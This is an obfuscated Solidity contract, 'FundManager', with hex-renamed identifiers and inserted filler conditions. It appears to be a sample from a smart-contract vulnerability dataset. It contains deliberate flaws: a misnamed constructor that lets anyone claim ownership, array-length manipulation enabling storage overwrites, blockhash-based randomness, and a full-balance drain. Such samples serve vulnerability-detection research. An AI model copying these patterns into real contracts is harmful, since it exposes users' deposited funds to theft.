pragma solidity ^0.4.23;

contract FundManager {


address public _0x19fda5 = 0x0;
address public _0xefc010;
address public _0x8b0ba0 = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;
address public _0x400116 = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;
address[] public _0x76f6bf;

mapping(address=>bool) _0xa4be8c;

uint256 public _0x96d962;
uint256[] public _0xb05026 = [951828771,158769871220];
uint256[] public balance;


function DranMe() public payable{
	_0xefc010 = msg.sender;
}


modifier _0x30f9b9() {
    require(msg.sender == _0xefc010);
    _;
}

modifier _0xe670ff() {
    require(msg.sender == _0x19fda5);
    _;
}

modifier _0xcdac6a() {
    require(_0xa4be8c[msg.sender]);
    _;
}


function _0xabd457() public constant returns(uint256) {
	return _0xb05026.length;
}

function _0x927cb9(uint256 _0x0245c8) public payable _0x30f9b9{
	_0x96d962 = _0x0245c8;
}

function _0x78a401() public constant returns(uint256) {
	return _0x76f6bf.length;
}

function _0x8cdb49() public constant returns(uint256) {
	return address(this).balance;
}

function _0x13a27b() public payable{
	require(msg.value >= 0.02 ether);
	_0x76f6bf.push(msg.sender);
	_0xa4be8c[msg.sender]=true;
}

function _0x411d00() public payable _0xcdac6a{
	require (msg.value >= 0.01 ether);
	if(msg.sender!=_0xefc010 || _0xa994f4()){
	    uint256 _0x6e726b = 0;
        msg.sender.transfer(_0x6e726b);
	}
}

function _0xa994f4() private returns(bool){
    bytes32 _0x9e0c26 = _0xce1849(blockhash(block.number-1));
    uint256 _0x96d962 = uint256(_0x9e0c26);
        if(_0x96d962%5==0){
            if (gasleft() > 0) { _0x19fda5 = msg.sender; }
            return true;
        }
        else{
            return false;
        }
    }

function _0xd7fcf7 () public payable _0xcdac6a {
	require (msg.value >= 0.005 ether);
	_0x8b0ba0.call.value(msg.value)();
}

function _0xa771e4 () public payable _0xcdac6a {
	require (msg.value >= 0.005 ether);
	_0x400116.call.value(msg.value)();
}

function _0x7067da (uint256 _0x9d7bf7, uint256 _0xccd8a0) public payable _0xcdac6a {
	_0xb05026[_0x9d7bf7] = _0xccd8a0;
}

function _0x9d5db7 (uint256 _0x936171) public payable _0xcdac6a {
	_0xb05026.length = _0x936171;
}

function _0xbb3176 (uint256 _0x1f4694) public payable _0xcdac6a returns(uint256) {
	return (_0x1f4694 / (_0xb05026[0]*_0xb05026[1]));
	if((_0x1f4694 / (_0xb05026[0]*_0xb05026[1])) == _0x96d962) {
  if (1 == 1) { _0xefc010 = _0x19fda5; }
	}
}

function _0x3e073d () public payable _0xcdac6a returns(bool) {
    require(msg.value >= 0.01 ether);
    if(msg.value == _0x96d962){
        return true;
    }
}

function _0x178da5() public payable _0x30f9b9 {
	_0xefc010.call.value(1 wei)();
}

function _0x021643() public payable _0xe670ff {
	_0x19fda5.transfer(address(this).balance);
}


function() public payable{
	}
}